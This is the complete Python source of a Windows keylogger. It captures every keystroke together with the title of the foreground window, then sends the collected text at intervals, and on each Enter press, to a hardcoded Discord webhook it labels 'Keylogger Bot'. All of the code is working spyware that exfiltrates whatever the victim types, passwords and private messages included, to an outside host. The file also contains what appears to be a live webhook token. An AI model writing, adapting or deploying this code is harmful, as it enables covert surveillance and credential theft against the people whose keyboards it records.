from pynput import keyboard
import requests
import threading
import win32gui
import time

# Replace with your Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1412343958075346965/l-oV4h4rQYeotjjRdoD1e2lzEnF5ml_KWr6WscPGt4ndahURi5UqRpMpwz3Z40HRipUl"

# Global variables
text = ""
current_window = ""
time_interval = 10  # Time interval in seconds to send data
listener = None
timer = None

def get_active_window():
    """Get the title of the currently active window."""
    try:
        hwnd = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(hwnd)
        return window_title if window_title else "Unknown Application"
    except Exception as e:
        return f"Error getting window: {e}"

def send_data():
    global text, current_window, timer
    if text.strip():  # Only send if there's data
        data = {
            "content": f"**Application**: {current_window}\n**Text**: {text}",
            "username": "Keylogger Bot",
            "avatar_url": ""
        }
        try:
            response = requests.post(webhook_url, json=data)
            if response.status_code == 204:
                print("Data sent to Discord successfully")
            else:
                print(f"Failed to send data: {response.status_code}")
        except Exception as e:
            print(f"Error sending data: {e}")
        text = ""  # Clear the text after sending
    else:
        print("No data to send")

    # Schedule the next send only if listener is running
    if listener is not None and listener.running:
        timer = threading.Timer(time_interval, send_data)
        timer.start()

def on_press(key):
    global text, current_window
    current_window = get_active_window()
    try:
        if key == keyboard.Key.enter:
            text += "\n"
            send_data()  # Send immediately on Enter
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.esc:
            if timer is not None:
                timer.cancel()  # Stop the timer
            return False  # Stop the listener
        else:
            # Append only the character, not the key representation
            char = str(key).strip("'")
            if len(char) == 1:  # Only append printable characters
                text += char
    except Exception as e:
        print(f"Error capturing key: {e}")

# Start the keylogger
with keyboard.Listener(on_press=on_press) as lst:
    listener = lst
    send_data()
    listener.join()